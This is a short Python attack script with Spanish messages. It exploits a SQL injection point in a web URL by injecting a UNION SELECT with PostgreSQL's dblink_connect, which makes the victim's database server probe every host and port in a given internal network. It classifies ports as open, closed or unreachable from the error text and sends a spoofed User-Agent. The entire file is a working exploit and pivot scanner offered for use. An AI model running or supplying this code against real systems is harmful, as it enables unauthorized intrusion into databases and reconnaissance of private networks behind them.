import requests
import sys
import ipaddress

if len(sys.argv) < 7:
    print ("Introduce los siguientes parámetros: <network> <netmask> <start port> <end port> <timeout> <url> <method>")
    sys.exit(0)
else:
    network = sys.argv[1]
    netmask = sys.argv[2]
    start_port = int(sys.argv[3])
    end_port   = int(sys.argv[4])
    timeout    = int(sys.argv[5])
    url        = sys.argv[6]
    method     = sys.argv[7]

headers = {'User-Agent' : 'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)'}

# Crear la red
net = ipaddress.ip_network(network + '/' + netmask)

for host in net.hosts():
    for port in range(start_port, end_port + 1):
        query = "1 UNION SELECT NULL,NULL,NULL,* from dblink_connect('host=" + str(host) + " port=" + str(port) + " user=name password=secret dbname=abc connect_timeout=" + str(timeout) + "')"
        url_query = url + requests.utils.quote(query)
        try:
            if method.lower() == 'get':
                res = requests.get(url_query, headers=headers, timeout=timeout)
            elif method.lower() == 'post':
                res = requests.post(url_query, headers=headers, timeout=timeout)
            else:
                print("Método no soportado: " + method)
                sys.exit(0)
            response = res.text
            if 'server closed the connection unexpectedly' in response:
                print ("Host: " + str(host) + " Port: " + str(port) + " OPEN")
            elif 'Connection refused' in response:
                print ("Host: " + str(host) + " Port: " + str(port) + " CLOSED")
            elif 'No route to host' in response:
                print ("Host: " + str(host) + " UNREACHABLE")
            else:
                print ("Host: " + str(host) + " Port: " + str(port) + " UNKNOWN RESPONSE")
        except Exception as e:
            print ("Host: " + str(host) + " Port: " + str(port) + " CLOSED/NOT REACHED")
            print ("Exception: ", e)

